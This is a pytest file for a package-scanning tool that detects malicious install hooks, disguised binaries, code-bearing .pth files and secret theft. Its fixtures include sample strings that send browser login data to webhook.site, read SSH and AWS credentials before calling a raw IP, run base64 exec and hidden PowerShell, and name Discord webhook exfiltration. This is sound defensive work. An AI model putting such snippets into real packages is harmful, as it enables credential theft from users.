import json

import pytest

from pkg_sentry.analyse import analyse, is_dev_file
from pkg_sentry.archive import File, Unpacked


def package(files, suspicious=()):
    return Unpacked([File(path, body.encode() if isinstance(body, str) else body)
                     for path, body in files.items()], [], list(suspicious))


def rules(files, ecosystem=None):
    return sorted({f.rule for f in analyse(package(files), ecosystem)})


def test_setup_py_runs_at_install():
    found = analyse(package({"setup.py": "import os\nos.system('curl x')"}))
    assert [f.rule for f in found] == ["shell-at-install"]


def test_modules_setup_py_imports_run_at_install_too():
    files = {
        "setup.py": "from setuptools import setup\nfrom main import run\nrun()\nsetup()",
        "main.py": "import subprocess\ndef run():\n    subprocess.Popen('calc.exe')",
    }
    assert "shell-at-install" in rules(files)


def test_import_time_code_in_any_module():
    found = rules({"pkg/__init__.py": "", "pkg/client.py": "import requests\nrequests.get('x')"})
    assert found == ["network-at-install"]
    assert rules({"beacon.py": "import requests\nrequests.get('x')"}) == ["network-at-install"]


def test_files_outside_any_package_cant_be_imported():
    found = rules({"vendored/packaging/release.py": "import subprocess\nsubprocess.run('x')"})
    assert found == ["shell"]


def test_scripts_that_cant_be_imported():
    files = {"pkg/__init__.py": "", "pkg/run-bench.py": "import subprocess\nsubprocess.run('x')"}
    assert rules(files) == ["shell"]


@pytest.mark.parametrize(
    "path",
    ["tests/test_x.py", "pkg/tests/helpers.py", "docs/conf.py", "examples/demo.py",
     "manual tests/build.py", "test_utils.py", "src/thing.test.js", "ci/install.sh",
     "unittests/x.py", "docs/make.bat"],
)
def test_dev_files(path):
    assert is_dev_file(path)


@pytest.mark.parametrize("path", ["pkg/client.py", "_pytest/main.py", "lib/index.js",
                                  "pytest_cov/plugin.py"])
def test_shipped_files(path):
    assert not is_dev_file(path)


def test_dev_files_only_count_never_innocent_signs():
    files = {
        "tests/test_api.py": "import os, subprocess\nsubprocess.run('x')\nu = 'http://8.8.8.8/'",
        "tests/test_evil.py": "u = 'https://discord.com/api/webhooks/1/x'",
    }
    assert rules(files) == ["exfil-endpoint"]


def test_npm_install_hook_files_run_at_install():
    files = {
        "package.json": json.dumps({"name": "x", "scripts": {"postinstall": "node lib/setup.js"}}),
        "lib/setup.js": "const https = require('https');\nhttps.get('https://x.example');",
        "lib/other.js": "const https = require('https');\nhttps.get('https://x.example');",
    }
    found = analyse(package(files), "npm")
    assert sorted((f.rule, f.path) for f in found) == [
        ("install-script", "package.json"), ("network-at-install", "lib/setup.js")]


def test_install_hook_files_count_even_in_a_scripts_folder():
    files = {
        "package.json": json.dumps({"scripts": {"preinstall": "node scripts/pre.js"}}),
        "scripts/pre.js": "require('child_process').exec('whoami')",
    }
    assert "shell-at-install" in rules(files, "npm")


def test_program_disguised_as_an_image():
    found = analyse(package({"assets/logo.png": b"MZ" + b"\0" * 100}))
    assert found[0].rule == "disguised-binary" and found[0].critical


def test_shipped_programs():
    assert rules({"bin/update.exe": b"MZ" + b"\0" * 100}) == ["binary-payload"]
    assert rules({"pkg/run_tests.bat": "@echo off"}) == []


def test_pth_file_with_code():
    found = analyse(package({"evil.pth": "import base64;exec(base64.b64decode('eA=='))"}))
    assert [f.rule for f in found] == ["pth-file"]
    assert analyse(package({"distutils-precedence.pth": "import os; var = 'x'"})) == []
    assert analyse(package({"paths.pth": "/usr/lib/extra"})) == []


def test_path_tricks_in_the_archive():
    found = analyse(package({}, suspicious=[("../../.bashrc", "path points outside")]))
    assert [f.rule for f in found] == ["archive-escape"]


def test_one_credential_file_is_not_theft():
    files = {"aws/config.py": "import requests\nCRED = '~/.aws/credentials'\nrequests.get('x')"}
    assert "steals-secrets" not in rules(files)


def test_browser_data_plus_a_way_out_is_theft():
    files = {"grab.py": "import requests\np = 'User Data/Default/Login Data'\n"
                        "def go():\n    requests.post('https://webhook.site/x', data=open(p))"}
    found = analyse(package(files))
    theft = [f for f in found if f.rule == "steals-secrets"][0]
    assert theft.critical  # paired with a known exfil service


def test_secrets_and_a_way_out_in_different_files_is_not_theft():
    files = {"cookies.py": "p = 'Default/Network/Cookies'",
             "sites.py": "SITES = ['https://gofile.io/d/']"}
    assert "steals-secrets" not in rules(files)


def test_honest_pth_files():
    nspkg = ("import sys, types, os;p = os.path.join(sys._getframe(1).f_locals['sitedir'], "
             "*('google',));importlib = __import__('importlib.util')")
    auto = "import os; exec('try: __import__(\"x\").auto_install()\nexcept: pass')"
    assert analyse(package({"x-nspkg.pth": nspkg, "auto.pth": auto})) == []


def test_tests_folders_dont_count_decoding_tricks():
    files = {"docs/_static/app.js": "eval(atob('ZXZhbA=='))",
             "tests/test_ps.py": "cmd = 'powershell -w hidden -c iex(x)'"}
    assert rules(files) == []


def test_several_kinds_of_credentials_plus_a_way_out_is_theft():
    files = {"x.py": "import requests\na = '~/.aws/credentials'\nb = '~/.npmrc'\n"
                     "c = '~/.ssh/id_rsa'\nrequests.get('http://45.61.137.218/')"}
    assert "steals-secrets" in rules(files)


def test_same_finding_is_reported_once():
    found = analyse(package({"a.py": "u = 'https://webhook.site/x'"}))
    assert len(found) == 1
